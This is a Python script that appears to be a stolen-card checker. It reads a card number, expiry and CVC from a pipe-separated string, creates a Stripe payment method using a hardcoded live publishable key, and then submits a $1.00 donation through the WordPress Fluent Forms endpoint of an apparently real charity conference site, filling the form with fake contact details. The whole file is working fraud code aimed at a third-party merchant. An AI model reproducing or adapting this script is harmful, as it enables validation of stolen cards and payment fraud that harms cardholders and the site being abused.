import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F0c7ffc14a8%3B+stripe-js-v3%2F0c7ffc14a8%3B+card-element&key=pk_live_51GNVZkCmff2HpFXWPLIJkfTlT6Su7Eq6gWYmMfHkrZQpfruXHDBKHaELfzSnhUQCfrGi1pQBwAGZtRXiv9KarRCj00PW04obKr'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.867590447.1744175270',
	    '__stripe_mid': '08136e65-9524-4895-b8df-61816985366e667d09',
	    '__stripe_sid': '011f83ac-0a73-4a4c-bb33-c3c0f23d9e5d9ecd34',
	    '_ga_GJL9GQNRTP': 'GS1.1.1744175270.1.1.1744175293.0.0.0',
	}
	
	headers = {
	    'authority': 'thehop-e.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.867590447.1744175270; __stripe_mid=08136e65-9524-4895-b8df-61816985366e667d09; __stripe_sid=011f83ac-0a73-4a4c-bb33-c3c0f23d9e5d9ecd34; _ga_GJL9GQNRTP=GS1.1.1744175270.1.1.1744175293.0.0.0',
	    'origin': 'https://thehop-e.com',
	    'referer': 'https://thehop-e.com/breathe-thru-grief-conference/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744175336019',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=6143&_fluentform_7_fluentformnonce=a357c8786e&_wp_http_referer=%2Fbreathe-thru-grief-conference%2F&name=Rodam%20User&address%5Baddress_line_1%5D=Street%2027&address%5Bcity%5D=New%20York&address%5Bstate%5D=New%20York&address%5Bzip%5D=10080&phone_number=0817480671&email_address=rodamuser08%40gmail.com&amount=1.00&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '7',
	}
	
	r2 = requests.post('https://thehop-e.com/wp-admin/admin-ajax.php', params=params, cookies=cookies, headers=headers, data=data)
	
	return (r2.json())
